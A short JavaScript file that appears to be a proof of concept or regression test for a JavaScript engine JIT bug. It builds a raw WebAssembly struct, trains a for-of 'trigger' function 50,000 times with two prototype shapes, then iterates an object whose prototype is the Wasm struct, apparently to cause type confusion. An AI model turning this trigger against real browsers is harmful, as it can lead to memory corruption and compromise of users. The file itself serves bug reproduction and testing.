const wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,95,3,2,1,0,7,12,1,8,99,114,101,97,116,101,77,101,0,0,10,8,1,6,0,65,0,111,11]);
const wasm_module = new WebAssembly.Module(wasm_code);
const wasm_instance = new WebAssembly.Instance(wasm_module);
const wasm_struct = wasm_instance.exports.createMe();

function trigger(obj) {
    try {
        for (const x of obj) {}
    } catch (e) {}
}

const proto1 = [1];
for (let i = 0; i < 50000; i++) {
    const o = Object.create(proto1);
    trigger(o);
}

const proto2 = {
    [Symbol.iterator]: function*() { yield 2; }
};
for (let i = 0; i < 50000; i++) {
    const o = Object.create(proto2);
    trigger(o);
}

const victim = {};
Object.setPrototypeOf(victim, wasm_struct);
trigger(victim);